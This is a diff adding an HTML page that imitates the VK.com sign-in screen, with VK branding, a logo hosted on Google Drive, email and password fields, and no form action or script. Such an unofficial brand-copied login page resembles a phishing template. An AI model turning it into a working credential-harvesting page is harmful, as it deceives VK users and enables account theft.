@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VK.com Login</title>
+<link rel="stylesheet" href="https://vk.com/css/login">
+<style>
+/* Remove outline on focused input fields */
+.content input[type="text"]:focus,
+.content input[type="password"]:focus {
+  outline: none;
+  /* You can also add any additional styling you want */
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background-color: #18191a;
+  color: #ffffff;
+  margin: 0;
+  padding: 0;
+}
+
+.container {
+  background-color: #36393f;
+  border-radius: 10px;
+  box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.2);
+  max-width: 360px; /* Reduced max-width */
+  margin: 40px auto; /* Reduced margin */
+  padding: 20px;
+  text-align: center;
+}
+
+.header {
+  margin-bottom: 20px;
+  text-align: center;
+  display: flex;
+  flex-direction: column; /* Stack the logo and text vertically */
+  align-items: center; /* Center align items horizontally */
+}
+
+.header img {
+  max-width: 80px; /* Reduced max-width */
+  margin-bottom: 10px; /* Add margin between logo and text */
+
+}
+
+.header-text {
+  color: #ffffff;
+  font-size: 20px; /* Reduced font size */
+}
+
+.content {
+  text-align: center;
+}
+
+.input-box {
+  background-color: #2f3136;
+  border-radius: 6px;
+  padding: 8px; /* Reduced padding */
+  margin: 8px auto; /* Reduced margin */
+  box-shadow: none; /* Remove shadow */
+}
+
+.content input[type="text"],
+.content input[type="password"] {
+  display: block;
+  width: calc(100% - 8px); /* Reduced width by 8px */
+  padding: 8px; /* Reduced padding */
+  margin: 4px 0; /* Reduced margin */
+  border: none;
+  border-radius: 6px;
+  font-size: 14px; /* Reduced font size */
+  background-color: #2f3136;
+  color: #ffffff;
+  box-shadow: none; /* Remove shadow */
+}
+
+.content .checkbox {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  margin-top: 6px; /* Reduced margin */
+  margin-bottom: 12px; /* Reduced margin */
+}
+
+.content .checkbox input[type="checkbox"] {
+  width: 16px; /* Reduced size */
+  height: 16px; /* Reduced size */
+  margin-right: 4px; /* Reduced margin */
+}
+
+.content input[type="submit"] {
+  background-color: #3578E5;
+  color: #fff;
+  cursor: pointer;
+  border: none;
+  border-radius: 6px;
+  padding: 10px; /* Same padding */
+  width: 100%;
+  font-size: 16px;
+  margin-top: 12px; /* Reduced margin */
+}
+
+.content input[type="submit"]:hover {
+  background-color: #2458b3;
+}
+
+.footer {
+  margin-top: 20px;
+  color: #666;
+}
+
+.footer a {
+  color: #3578E5;
+  text-decoration: none;
+  margin: 0 10px;
+}
+
+.signup-box {
+  background-color: #36393f;
+  border-radius: 10px;
+  box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.2);
+  padding: 20px;
+  margin-top: 10px;
+  text-align: center;
+  max-width: 360px; /* Reduced max-width */
+  margin: 0 auto;
+}
+
+.signup-box a {
+  color: #3758E5; /* Change this color to your preference */
+  text-decoration: none;
+}
+
+.signup-box h2 {
+  margin-bottom: 8px; /* Reduced margin */
+  color: #ffffff;
+}
+
+.signup-box p {
+  color: #999;
+  margin-bottom: 10px; /* Reduced margin */
+}
+
+.signup-button {
+  background-color: #00a859;
+  color: #fff;
+  cursor: pointer;
+  border: none;
+  border-radius: 6px;
+  padding: 12px; /* Increased padding */
+  width: 100%;
+  font-size: 18px; /* Increased font size */
+}
+
+.signup-button:hover {
+  background-color: #00894e;
+}
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+        <img src="https://drive.google.com/file/d/1WX0AhjAHt2CbyYC9GGYjbvSJES0V9VUf/view?usp=drivesdk"> <!-- Replace with the actual URL to the VK logo image -->
+        <div class="header-text"></div>
+        </div>
+<div class="container">
+<div class="header">
+<img src="">
+<div class="header-text">Sign in to VK</div>
+</div>
+<div class="content">
+<div class="input-box">
+<input type="text" name="email_phone" placeholder="Email or phone">
+</div>
+<div class="input-box">
+<input type="password" name="password" placeholder="Password">
+</div>
+<div class="checkbox">
+<input type="checkbox" id="save_user" name="save_user">
+<label for="save_user">Save user</label>
+</div>
+<input type="submit" value="Sign In">
+</div>
+<div class="footer">
+<a href="https://vk.com/join">Join VK</a>
+<a href="https://vk.com/forgot">Forgot your password?</a>
+</div>
+</div>
+<div class="signup-box">
+<h2>Don't have an account?</h2>
+<p>After signing up, you'll get access to all of VK's features.</p>
+<button class="signup-button">Sign Up</button>
+</div>
+<div class="footer">
+<span>&nbsp;&nbsp;&nbsp;VK@2006-2023</span>
+<a href="#">About VK</a>
+<a href="#">Terms</a>
+<a href="#">Developers</a>
+</div>
+</body>
+</html>
